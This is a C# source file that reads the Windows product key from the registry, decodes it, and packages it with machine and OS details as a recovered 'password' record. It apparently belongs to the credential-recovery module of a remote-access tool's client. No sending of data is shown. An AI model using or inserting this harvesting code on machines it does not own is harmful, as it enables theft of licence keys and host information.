using Pulsar.Common.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using Microsoft.Win32;

namespace Pulsar.Client.Recovery
{
    internal static class WindowsKeyReader
    {
        // ================================================================
        //  WMI HELPERS
        // ================================================================
        private static string Query(string field)
        {
            try
            {
                var obj = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem")
                    .Get()
                    .OfType<ManagementObject>()
                    .FirstOrDefault();

                if (obj == null)
                    return "Unknown";

                var result = obj.GetPropertyValue(field);
                return result?.ToString() ?? "Unknown";
            }
            catch
            {
                return "Unknown";
            }
        }

        private static string GetWindowsProductName() => Query("Caption");
        private static string GetWindowsBuildNumber() => Query("BuildNumber");
        private static string GetWindowsProductId() => Query("SerialNumber");
        private static string GetWindowsDirectory() => Query("WindowsDirectory");
        private static string GetMachineName() => Environment.MachineName;



        // ================================================================
        //  DECODER IMPLEMENTATION (FULL MERGED CODE)
        // ================================================================
        private enum DigitalProductIdVersion
        {
            UpToWindows7,
            Windows8AndUp
        }

        private static string GetWindowsProductKey()
        {
            try
            {
                var localKey = RegistryKey.OpenBaseKey(
                    RegistryHive.LocalMachine,
                    Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32
                );

                var value = localKey
                    .OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                    ?.GetValue("DigitalProductId");

                if (value == null)
                    return "DigitalProductId missing";

                var digitalProductId = (byte[])value;

                bool win8OrNewer =
                    (Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor >= 2)
                    || Environment.OSVersion.Version.Major > 6;

                return DecodeProductKey(digitalProductId,
                    win8OrNewer ? DigitalProductIdVersion.Windows8AndUp : DigitalProductIdVersion.UpToWindows7);
            }
            catch (Exception ex)
            {
                return "Decode failed: " + ex.Message;
            }
        }

        private static string DecodeProductKey(byte[] digitalProductId, DigitalProductIdVersion version)
        {
            return version == DigitalProductIdVersion.Windows8AndUp
                ? DecodeProductKeyWin8AndUp(digitalProductId)
                : DecodeProductKeyWin7AndBelow(digitalProductId);
        }

        // ---------------- WINDOWS 7 & OLDER ----------------
        private static string DecodeProductKeyWin7AndBelow(byte[] digitalProductId)
        {
            const int keyStartIndex = 52;
            const int keyEndIndex = keyStartIndex + 15;
            var digits = new[]
            {
                'B','C','D','F','G','H','J','K','M','P','Q','R',
                'T','V','W','X','Y','2','3','4','6','7','8','9'
            };

            const int decodeLength = 29;
            const int decodeStringLength = 15;

            var decodedChars = new char[decodeLength];
            var hexPid = new ArrayList();

            for (int i = keyStartIndex; i <= keyEndIndex; i++)
                hexPid.Add(digitalProductId[i]);

            for (int i = decodeLength - 1; i >= 0; i--)
            {
                if ((i + 1) % 6 == 0)
                {
                    decodedChars[i] = '-';
                }
                else
                {
                    int digitMapIndex = 0;

                    for (int j = decodeStringLength - 1; j >= 0; j--)
                    {
                        int value = (digitMapIndex << 8) | (byte)hexPid[j];
                        hexPid[j] = (byte)(value / 24);
                        digitMapIndex = value % 24;
                    }

                    decodedChars[i] = digits[digitMapIndex];
                }
            }

            return new string(decodedChars);
        }

        // ---------------- WINDOWS 8 & NEWER ----------------
        private static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
        {
            const int keyOffset = 52;
            string key = "";

            int isWin8 = (digitalProductId[66] / 6) & 1;
            digitalProductId[66] = (byte)((digitalProductId[66] & 0xF7) | (isWin8 & 2) * 4);

            const string digits = "BCDFGHJKMPQRTVWXY2346789";

            int last = 0;
            for (int i = 24; i >= 0; i--)
            {
                int current = 0;
                for (int j = 14; j >= 0; j--)
                {
                    current = current * 256 + digitalProductId[j + keyOffset];
                    digitalProductId[j + keyOffset] = (byte)(current / 24);
                    current %= 24;
                    last = current;
                }
                key = digits[current] + key;
            }

            string keypart1 = key.Substring(1, last);
            string keypart2 = key.Substring(last + 1);

            key = keypart1 + "N" + keypart2;

            for (int i = 5; i < key.Length; i += 6)
                key = key.Insert(i, "-");

            return key;
        }



        // ================================================================
        //  MAIN RECOVERY ENTRYPOINT
        // ================================================================
        public static List<RecoveredAccount> Read()
        {
            var list = new List<RecoveredAccount>();

            try
            {
                list.Add(new RecoveredAccount
                {
                    Application = "Windows",
                    Username = GetMachineName(),
                    Password = GetWindowsProductKey(),
                    Url =
                        $"{GetWindowsProductName()} | Build {GetWindowsBuildNumber()} | " +
                        $"ProductID {GetWindowsProductId()} | Dir {GetWindowsDirectory()}"
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine("WindowsKeyReader Error: " + ex.Message);
            }

            return list;
        }
    }
}
